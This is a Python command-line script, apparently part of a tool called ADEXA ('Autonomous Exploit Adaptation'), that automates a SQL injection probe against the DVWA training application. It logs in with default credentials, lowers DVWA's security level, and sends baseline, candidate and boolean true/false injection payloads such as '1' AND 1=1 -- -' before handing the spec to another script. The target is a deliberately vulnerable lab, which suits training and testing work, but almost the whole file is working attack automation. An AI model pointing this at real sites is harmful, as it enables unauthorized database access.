import argparse
import json
import subprocess
import tempfile
from urllib.parse import urlsplit, parse_qsl, urlencode


def split_dvwa_url(url: str):
    parsed = urlsplit(url)

    if not parsed.scheme or not parsed.netloc:
        raise ValueError(
            "URL must include scheme and host, for example: "
            "http://localhost/dvwa/vulnerabilities/sqli/"
        )

    full_path = parsed.path or "/"
    marker = "/vulnerabilities/"
    idx = full_path.find(marker)

    if idx == -1:
        raise ValueError(
            "URL must point to a DVWA vulnerability page, for example: "
            "http://localhost/dvwa/vulnerabilities/sqli/"
        )

    app_prefix = full_path[:idx]
    vuln_path = full_path[idx:]

    base_url = f"{parsed.scheme}://{parsed.netloc}{app_prefix}"
    return base_url, vuln_path, parsed.query


def build_dvwa_poc_spec(
    url: str,
    param: str,
    payload: str,
    method: str,
    username: str,
    password: str,
) -> dict:
    base_url, sqli_path, existing_query = split_dvwa_url(url)

    method = method.upper()
    if method != "GET":
        raise ValueError("This CLI version currently supports DVWA SQLi GET mode only.")

    original_query = dict(parse_qsl(existing_query, keep_blank_values=True))

    def make_query_path(test_value: str) -> str:
        q = dict(original_query)
        q[param] = test_value
        q["Submit"] = "Submit"
        return f"{sqli_path}?{urlencode(q)}"

    baseline_value = "1"
    candidate_value = payload

    # dedicated verification probes
    true_value = "1' AND 1=1 -- -"
    false_value = "1' AND 1=2 -- -"

    spec = {
        "name": "ADEXA CLI DVWA SQLi candidate run",
        "base_url": base_url,
        "timeout": 20,
        "adexa_cli": {
            "param": param,
            "baseline_value": baseline_value,
            "starting_payload": candidate_value,
            "candidate_step": "sqli_candidate",
            "baseline_step": "sqli_baseline",
            "true_step": "sqli_true",
            "false_step": "sqli_false",
            "suggested_true_payload": true_value,
            "suggested_false_payload": false_value,
        },
        "steps": [
            {
                "id": "get_login",
                "name": "GET login page (fetch user_token if present)",
                "method": "GET",
                "path": "/login.php",
                "headers": {}
            },
            {
                "id": "login",
                "name": "POST login (username/password + user_token if required)",
                "method": "POST",
                "path": "/login.php",
                "headers": {
                    "Content-Type": "application/x-www-form-urlencoded"
                },
                "body": (
                    f"username={username}"
                    f"&password={password}"
                    f"&Login=Login"
                    f"&user_token={{{{user_token}}}}"
                )
            },
            {
                "id": "home_check",
                "name": "Verify authenticated session",
                "method": "GET",
                "path": "/",
                "headers": {}
            },
            {
                "id": "get_security",
                "name": "GET security page",
                "method": "GET",
                "path": "/security.php",
                "headers": {}
            },
            {
                "id": "set_security_low",
                "name": "POST security=low",
                "method": "POST",
                "path": "/security.php",
                "headers": {
                    "Content-Type": "application/x-www-form-urlencoded"
                },
                "body": "security=low&seclev_submit=Submit&user_token={{user_token}}"
            },
            {
                "id": "security_check",
                "name": "Confirm security is low",
                "method": "GET",
                "path": "/security.php",
                "headers": {}
            },
            {
                "id": "sqli_page",
                "name": "Open SQLi page",
                "method": "GET",
                "path": sqli_path,
                "headers": {}
            },
            {
                "id": "sqli_baseline",
                "name": f"SQLi baseline request ({param}={baseline_value})",
                "method": "GET",
                "path": make_query_path(baseline_value),
                "headers": {}
            },
            {
                "id": "sqli_candidate",
                "name": f"Candidate payload ({param}={candidate_value})",
                "method": "GET",
                "path": make_query_path(candidate_value),
                "headers": {}
            },
            {
                "id": "sqli_true",
                "name": f"Boolean TRUE comparator ({param}={true_value})",
                "method": "GET",
                "path": make_query_path(true_value),
                "headers": {}
            },
            {
                "id": "sqli_false",
                "name": f"Boolean FALSE comparator ({param}={false_value})",
                "method": "GET",
                "path": make_query_path(false_value),
                "headers": {}
            }
        ],
        "success": {
            "require_security_level": "low",
            "boolean_diff": {
                "baseline_step": "sqli_baseline",
                "true_step": "sqli_true",
                "false_step": "sqli_false"
            }
        }
    }

    return spec


def main() -> None:
    parser = argparse.ArgumentParser(
        description="ADEXA - Autonomous Exploit Adaptation CLI"
    )

    parser.add_argument("--url", required=True, help="Target DVWA SQLi URL")
    parser.add_argument("--param", required=True, help="Parameter to inject")
    parser.add_argument("--payload", required=True, help="Starting candidate payload")
    parser.add_argument("--method", default="GET", help="HTTP method (default: GET)")
    parser.add_argument("--mode", default="web", help="Execution mode (default: web)")
    parser.add_argument("--username", default="admin", help="DVWA username (default: admin)")
    parser.add_argument("--password", default="password", help="DVWA password (default: password)")

    args = parser.parse_args()

    print(f"[ADEXA CLI] Target: {args.url}")
    print(f"[ADEXA CLI] Parameter: {args.param}")
    print(f"[ADEXA CLI] Candidate payload: {args.payload}")
    print(f"[ADEXA CLI] Method: {args.method.upper()}")
    print(f"[ADEXA CLI] Mode: {args.mode}")
    print(f"[ADEXA CLI] Username: {args.username}")

    spec = build_dvwa_poc_spec(
        url=args.url,
        param=args.param,
        payload=args.payload,
        method=args.method,
        username=args.username,
        password=args.password,
    )

    print(f"[ADEXA CLI] base_url: {spec['base_url']}")

    with tempfile.NamedTemporaryFile(
        mode="w",
        delete=False,
        suffix=".json",
        encoding="utf-8"
    ) as f:
        json.dump(spec, f, indent=2)
        spec_path = f.name

    print(f"[ADEXA CLI] Generated PoC spec: {spec_path}")

    subprocess.run(
        ["python3", "main.py", spec_path, args.mode],
        check=False
    )


if __name__ == "__main__":
    main()
